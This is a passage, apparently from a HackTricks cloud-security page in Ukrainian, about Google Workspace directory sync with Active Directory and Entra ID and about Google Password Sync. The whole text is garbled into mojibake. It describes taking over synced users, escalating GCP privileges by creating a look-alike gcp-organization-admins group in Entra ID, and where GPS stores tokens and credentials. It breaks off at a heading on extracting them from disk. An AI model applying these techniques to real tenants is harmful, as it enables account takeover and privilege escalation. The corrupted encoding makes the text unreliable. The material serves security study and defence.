–ù–µ–º–æ–∂–ª–∏–≤–æ –Ω–∞–¥–∞—Ç–∏ –Ω–æ–≤–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É —Ä–æ–ª—å Super Admin, –æ—Å–∫—ñ–ª—å–∫–∏ **—Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–µ –º–∞—î –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –æ–±—Å—è–≥—ñ–≤** –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
{% endhint %}

## –°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É

–û—Å–Ω–æ–≤–Ω–∞ —Ä—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ —Ü–∏–º —Å–ø–æ—Å–æ–±–æ–º —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ GCDS –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ GCDS –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤—Ä—É—á–Ω—É –∑ –¥–µ—è–∫–∏–º–∏ –±—ñ–Ω–∞—Ä–Ω–∏–º–∏ —Ñ–∞–π–ª–∞–º–∏, —è–∫—ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ç–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏, —Ç–æ–¥—ñ —è–∫ **–°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É —î –±–µ–∑—Å–µ—Ä–≤–µ—Ä–Ω–æ—é** —ñ –∫–µ—Ä—É—î—Ç—å—Å—è Google –Ω–∞ [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

–ù–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è —Ü—å–æ–≥–æ –º–∞—Ç–µ—Ä—ñ–∞–ª—É —Ü—è —Å–ª—É–∂–±–∞ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –±–µ—Ç–∞-–≤–µ—Ä—Å—ñ—ó —ñ –ø—ñ–¥—Ç—Ä–∏–º—É—î 2 —Ç–∏–ø–∏ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó: –∑ **Active Directory** —Ç–∞ –∑ **Azure Entra ID:**

* **Active Directory:** –©–æ–± –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Ü–µ, –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥–∞—Ç–∏ **–¥–æ—Å—Ç—É–ø Google –¥–æ –≤–∞—à–æ–≥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ Active Directory**. –û—Å–∫—ñ–ª—å–∫–∏ Google –º–∞—î –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –¥–æ –º–µ—Ä–µ–∂ GCP (—á–µ—Ä–µ–∑ **VPC connectors**), –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫–æ–Ω–µ–∫—Ç–æ—Ä, –∞ –ø–æ—Ç—ñ–º –∑—Ä–æ–±–∏—Ç–∏ –≤–∞—à AD –¥–æ—Å—Ç—É–ø–Ω–∏–º –∑ —Ü—å–æ–≥–æ –∫–æ–Ω–µ–∫—Ç–æ—Ä–∞, —Ä–æ–∑–º—ñ—Å—Ç–∏–≤—à–∏ –π–æ–≥–æ –Ω–∞ –í–ú —É –º–µ—Ä–µ–∂—ñ GCP –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Cloud VPN –∞–±–æ Cloud Interconnect. –ü–æ—Ç—ñ–º –≤–∞–º —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥–∞—Ç–∏ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∑ –ø—Ä–∞–≤–∞–º–∏ —á–∏—Ç–∞–Ω–Ω—è –Ω–∞–¥ –∫–∞—Ç–∞–ª–æ–≥–æ–º —Ç–∞ **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç** –¥–ª—è –∑–≤'—è–∑–∫—É —á–µ—Ä–µ–∑ **LDAPS**.
* **Azure Entra ID:** –î–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—Ä–æ—Å—Ç–æ **—É–≤—ñ–π—Ç–∏ –≤ Azure –∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –∑ –ø—Ä–∞–≤–∞–º–∏ —á–∏—Ç–∞–Ω–Ω—è** –Ω–∞–¥ –ø—ñ–¥–ø–∏—Å–∫–æ—é Entra ID —É —Å–ø–ª–∏–≤–∞—é—á–æ–º—É –≤—ñ–∫–Ω—ñ, —è–∫–µ –≤—ñ–¥–æ–±—Ä–∞–∑–∏—Ç—å Google, —ñ Google –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ —Ç–æ–∫–µ–Ω –∑ –ø—Ä–∞–≤–∞–º–∏ —á–∏—Ç–∞–Ω–Ω—è –Ω–∞–¥ Entra ID.

–ü—ñ—Å–ª—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –æ–±–∏–¥–≤–∞ –≤–∞—Ä—ñ–∞–Ω—Ç–∏ –¥–æ–∑–≤–æ–ª—è—Ç—å **—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø–∏ –∑ Workspace**, –∞–ª–µ –Ω–µ –¥–æ–∑–≤–æ–ª—è—Ç—å –Ω–∞–ª–∞—à—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø–∏ –∑ Workspace –¥–æ AD –∞–±–æ EntraID.

–Ü–Ω—à—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ, —è–∫—ñ –±—É–¥—É—Ç—å –¥–æ—Å—Ç—É–ø–Ω—ñ –ø—ñ–¥ —á–∞—Å —Ü—ñ—î—ó —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó:

* –ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏–π –ª–∏—Å—Ç –Ω–æ–≤–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –¥–ª—è –≤—Ö–æ–¥—É
* –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–º—ñ–Ω–∏—Ç–∏ —ó—Ö–Ω—é –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –∞–¥—Ä–µ—Å—É –Ω–∞ —Ç—É, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è Workspace. –¢–æ–±—Ç–æ, —è–∫—â–æ Workspace –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `@hacktricks.xyz`, –∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ EntraID –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å `@carloshacktricks.onmicrosoft.com`, —Ç–æ `@hacktricks.xyz` –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω–∏—Ö –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ.
* –í–∏–±—Ä–∞—Ç–∏ **–≥—Ä—É–ø–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**, —è–∫—ñ –±—É–¥—É—Ç—å —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω—ñ.
* –í–∏–±—Ä–∞—Ç–∏ **–≥—Ä—É–ø–∏** –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó —Ç–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –≤ Workspace (–∞–±–æ –≤–∫–∞–∑–∞—Ç–∏ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É–≤–∞—Ç–∏ –≤—Å—ñ –≥—Ä—É–ø–∏).

### –ó AD/EntraID -> Google Workspace (& GCP)

–Ø–∫—â–æ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ AD –∞–±–æ EntraID, –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ —Ç–∞ –≥—Ä—É–ø–∞–º–∏, —è–∫—ñ –±—É–¥—É—Ç—å —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω—ñ –∑ Google Workspace.\
–û–¥–Ω–∞–∫ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–ø–∞—Ä–æ–ª—ñ**, —è–∫—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤ Workspace, **–º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–º–∏ –∞–±–æ –Ω—ñ**.

#### –ê—Ç–∞–∫–∞ –Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

–ö–æ–ª–∏ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è, –º–æ–∂—É—Ç—å —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É–≤–∞—Ç–∏—Å—è **–≤—Å—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ AD –∞–±–æ –ª–∏—à–µ —Ç—ñ, —â–æ –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ OU** –∞–±–æ –ª–∏—à–µ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ, —è–∫—ñ —î —á–ª–µ–Ω–∞–º–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –≥—Ä—É–ø –≤ EntraID**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –¥–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–∞–±–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ, —è–∫–∏–π –±—É–¥–µ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–∏–π) –≤–∞–º —Å–ø–æ—á–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑'—è—Å—É–≤–∞—Ç–∏, —è–∫—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—é—Ç—å—Å—è.

* –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å **–ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—å –∞–±–æ –Ω—ñ –∑ AD –∞–±–æ EntraID**, –∞–ª–µ —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **—Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–ª—è –≤—Ö–æ–¥—É**.
* –Ø–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ **–µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏—Ö –ª–∏—Å—Ç—ñ–≤** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å Workspace —ñ—Å–Ω—É—é—á–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, –∞–±–æ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, –ø–æ—á–µ–∫–∞—Ç–∏, –ø–æ–∫–∏ –≤—ñ–Ω –±—É–¥–µ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–∏–π, —ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å.

–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –¥–æ—Å—Ç—É–ø –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ Workspace, –π–æ–º—É –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–∞–¥–∞–Ω—ñ –¥–µ—è–∫—ñ **–¥–æ–∑–≤–æ–ª–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**.

#### –ê—Ç–∞–∫–∞ –Ω–∞ –≥—Ä—É–ø–∏

–í–∞–º —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–ø–æ—á–∞—Ç–∫—É –∑'—è—Å—É–≤–∞—Ç–∏, —è–∫—ñ –≥—Ä—É–ø–∏ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—é—Ç—å—Å—è. –•–æ—á–∞ —ñ—Å–Ω—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å, —â–æ **–í–°–Ü** –≥—Ä—É–ø–∏ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—é—Ç—å—Å—è (–æ—Å–∫—ñ–ª—å–∫–∏ Workspace —Ü–µ –¥–æ–∑–≤–æ–ª—è—î).

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≥—Ä—É–ø–∏ —Ç–∞ —á–ª–µ–Ω—Å—Ç–≤–∞ —ñ–º–ø–æ—Ä—Ç—É—é—Ç—å—Å—è –≤ Workspace, **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ, —è–∫—ñ –Ω–µ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—é—Ç—å—Å—è –≤ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –Ω–µ –±—É–¥—É—Ç—å —Å—Ç–≤–æ—Ä–µ–Ω—ñ** –ø—ñ–¥ —á–∞—Å —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –≥—Ä—É–ø, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–æ–Ω–∏ —î —á–ª–µ–Ω–∞–º–∏ –±—É–¥—å-—è–∫–æ—ó –∑ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–∏—Ö –≥—Ä—É–ø.
{% endhint %}

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ, —è–∫—ñ –≥—Ä—É–ø–∏ –∑ Azure –æ—Ç—Ä–∏–º—É—é—Ç—å **–¥–æ–∑–≤–æ–ª–∏ –≤ Workspace –∞–±–æ GCP**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –¥–æ–¥–∞—Ç–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–∞–±–æ –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ) –¥–æ —Ü—ñ—î—ó –≥—Ä—É–ø–∏ —Ç–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü—ñ –¥–æ–∑–≤–æ–ª–∏.

–Ñ —â–µ –æ–¥–∏–Ω –≤–∞—Ä—ñ–∞–Ω—Ç –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —ñ—Å–Ω—É—é—á–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º–∏ –≥—Ä—É–ø–∞–º–∏ –≤ Workspace. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≥—Ä—É–ø–∞ `gcp-organization-admins@<workspace.email>` –∑–∞–∑–≤–∏—á–∞–π –º–∞—î –≤–∏—Å–æ–∫—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –Ω–∞–¥ GCP.

–Ø–∫—â–æ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑ EntraID –¥–æ Workspace **–Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –Ω–∞ –∑–∞–º—ñ–Ω—É –¥–æ–º–µ–Ω—É** —ñ–º–ø–æ—Ä—Ç–æ–≤–∞–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞ **–µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—é –∞–¥—Ä–µ—Å–æ—é Workspace**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –≥—Ä—É–ø—É `gcp-organization-admins@<entraid.email>` –≤ EntraID, –¥–æ–¥–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ —Ü—ñ—î—ó –≥—Ä—É–ø–∏ —Ç–∞ –ø–æ—á–µ–∫–∞—Ç–∏, –ø–æ–∫–∏ –≤—ñ–¥–±—É–¥–µ—Ç—å—Å—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –≤—Å—ñ—Ö –≥—Ä—É–ø.\
**–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –±—É–¥–µ –¥–æ–¥–∞–Ω–∏–π –¥–æ –≥—Ä—É–ø–∏ `gcp-organization-admins@<workspace.email>`, –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤ GCP.**

### –ó Google Workspace -> AD/EntraID

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ Workspace –≤–∏–º–∞–≥–∞—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑ –¥–æ—Å—Ç—É–ø–æ–º –ª–∏—à–µ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –¥–æ AD –∞–±–æ EntraID –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø. –¢–æ–º—É **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ Google Workspace –¥–ª—è –≤–Ω–µ—Å–µ–Ω–Ω—è –∑–º—ñ–Ω –≤ AD –∞–±–æ EntraID –Ω–µ–º–æ–∂–ª–∏–≤–æ**. –û—Ç–∂–µ, **—Ü–µ –Ω–∞—Ä–∞–∑—ñ –Ω–µ–º–æ–∂–ª–∏–≤–æ**.

–Ø —Ç–∞–∫–æ–∂ –Ω–µ –∑–Ω–∞—é, –¥–µ Google –∑–±–µ—Ä—ñ–≥–∞—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ AD –∞–±–æ —Ç–æ–∫–µ–Ω EntraID, —ñ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö, –ø–µ—Ä–µ–Ω–∞–ª–∞—à—Ç—É–≤–∞–≤—à–∏ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é** (–≤–æ–Ω–∏ –Ω–µ –∑'—è–≤–ª—è—é—Ç—å—Å—è —É –≤–µ–±-—Ñ–æ—Ä–º—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–≤–µ—Å—Ç–∏ —ó—Ö –∑–Ω–æ–≤—É). –û–¥–Ω–∞–∫ –∑ –≤–µ–±-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É –º–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–∏–º –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω–æ—é —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—é –¥–ª—è **–ø–µ—Ä–µ–≥–ª—è–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø**.

## GPS - –°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –ø–∞—Ä–æ–ª—ñ–≤ Google

–¶–µ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —ñ —Å–ª—É–∂–±–∞, —è–∫—É Google –ø—Ä–æ–ø–æ–Ω—É—î –¥–ª—è **–∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –ø–∞—Ä–æ–ª—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –º—ñ–∂ AD** —Ç–∞ Workspace. –ö–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑–º—ñ–Ω—é—î —Å–≤—ñ–π –ø–∞—Ä–æ–ª—å –≤ AD, –≤—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –≤ Google.

–í—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –≤ `C:\Program Files\Google\Password Sync`, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `PasswordSync.exe` –¥–ª—è –π–æ–≥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ `password_sync_service.exe` (—Å–ª—É–∂–±–∞, —è–∫–∞ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç—å –ø—Ä–∞—Ü—é–≤–∞—Ç–∏).

### GPS - –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è

–©–æ–± –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Ü–µ–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª (—ñ —Å–ª—É–∂–±—É), –ø–æ—Ç—Ä—ñ–±–Ω–æ **–Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ Super Admin —É Workspace**:

* –£–≤—ñ–π—Ç–∏ —á–µ—Ä–µ–∑ **OAuth** –∑ Google, –∞ –ø–æ—Ç—ñ–º –≤—ñ–Ω **–∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ —Ç–æ–∫–µ–Ω —É —Ä–µ—î—Å—Ç—Ä—ñ (–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π)**
* –î–æ—Å—Ç—É–ø–Ω–æ –ª–∏—à–µ –Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞—Ö –¥–æ–º–µ–Ω—É –∑ GUI
* –ù–∞–¥–∞—Ç–∏ –¥–µ—è–∫—ñ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ –∑ GCP** (json —Ñ–∞–π–ª) –∑ –ø—Ä–∞–≤–∞–º–∏ –Ω–∞ **–∫–µ—Ä—É–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ Workspace**
* –î—É–∂–µ –ø–æ–≥–∞–Ω–∞ —ñ–¥–µ—è, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∑–∞–∫—ñ–Ω—á—É—é—Ç—å—Å—è —ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞–Ω—ñ
* –î—É–∂–µ –ø–æ–≥–∞–Ω–∞ —ñ–¥–µ—è –Ω–∞–¥–∞–≤–∞—Ç–∏ SA –¥–æ—Å—Ç—É–ø –¥–æ Workspace, –æ—Å–∫—ñ–ª—å–∫–∏ SA –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —É GCP, —ñ –±—É–¥–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ–π—Ç–∏ –¥–æ Workspace
* Google –≤–∏–º–∞–≥–∞—î —Ü–µ –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ–º–µ–Ω—É –±–µ–∑ GUI
* –¶—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ç–∞–∫–æ–∂ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ —Ä–µ—î—Å—Ç—Ä—ñ

–©–æ–¥–æ AD, –º–æ–∂–ª–∏–≤–æ –≤–∫–∞–∑–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω–∏–π **–∫–æ–Ω—Ç–µ–∫—Å—Ç –¥–æ–¥–∞—Ç–∫—ñ–≤, –∞–Ω–æ–Ω—ñ–º–Ω–∏–π –∞–±–æ –¥–µ—è–∫—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**. –Ø–∫—â–æ –≤–∏–±—Ä–∞–Ω–æ –≤–∞—Ä—ñ–∞–Ω—Ç –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ —Ñ–∞–π–ª—ñ –Ω–∞ **–¥–∏—Å–∫—É**, –∞ **–ø–∞—Ä–æ–ª—å** **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π** —ñ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ **—Ä–µ—î—Å—Ç—Ä—ñ**.

### GPS - –í–∏—Ç—è–≥ –ø–∞—Ä–æ–ª—ñ–≤ —ñ —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –¥–∏—Å–∫–∞

{% hint style="success" %}
